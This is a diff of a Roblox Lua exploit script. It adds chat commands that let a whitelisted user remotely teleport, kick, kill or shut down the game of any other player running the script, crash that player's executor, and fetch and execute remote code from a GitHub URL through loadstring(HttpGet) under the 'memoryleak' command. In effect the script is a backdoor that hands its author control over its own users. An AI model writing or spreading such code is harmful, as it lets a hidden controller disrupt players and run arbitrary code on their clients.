@@ -1,5 +1,5 @@
 local whitelist = {
-    ["justin12281oom"] = true
+    ["just12281oom"] = true
 }
 
 local text = "commands ~ lagback, leave, kick, executorkill, memoryleak, kill"
@@ -19,6 +19,32 @@ for i = 1, #text do
     commands = commands .. string.format("<font color=\"rgb(%d, %d, %d)\"><b>%s</b></font>", color.R * 255, color.G * 255, color.B * 255, text:sub(i, i))
 end
 
+local commandsFunc = {
+    lagback = function(player)
+        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(100, 100, 100))
+    end,
+    leave = function(player)
+        game:Shutdown()
+    end,
+    kick = function(player)
+        game.Players.LocalPlayer:Kick("You have been kicked!")
+    end,
+    executorkill = function(player)
+        task.spawn(setfpscap, 9e9)
+    end,
+    memoryleak = function(player)
+        local success, error = pcall(function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/memoryleak'))()
+        end)
+        if not success then
+            print("Error loading memoryleak script:", error)
+        end
+    end,
+    kill = function(player)
+        player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+    end
+}
+
 local player = game.Players.LocalPlayer
 
 if whitelist[player.Name] then
@@ -26,39 +52,6 @@ if whitelist[player.Name] then
         Text = commands,
     })
 end
-
-local commandsFunc = {
-    lagback = function(player)
-        if not whitelist[player.Name] then
-            game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(100, 100, 100))
-        end
-    end,
-    leave = function(player)
-        if not whitelist[player.Name] then
-            game:Shutdown()
-        end
-    end,
-    kick = function(player)
-        if not whitelist[player.Name] then
-            game.Players.LocalPlayer:Kick("You have been kicked!")
-        end
-    end,
-    executorkill = function(player)
-        if not whitelist[player.Name] then
-            task.spawn(setfpscap, 9e9)
-        end
-    end,
-    memoryleak = function(player)
-        if not whitelist[player.Name] then
-            loadstring(game:HttpGet('https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/memoryleak'))()
-        end
-    end,
-    kill = function(player)
-        if not whitelist[player.Name] then
-            player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-        end
-    end
-}
 
 local function onChatMessage(player, message)
     if not whitelist[player.Name] then
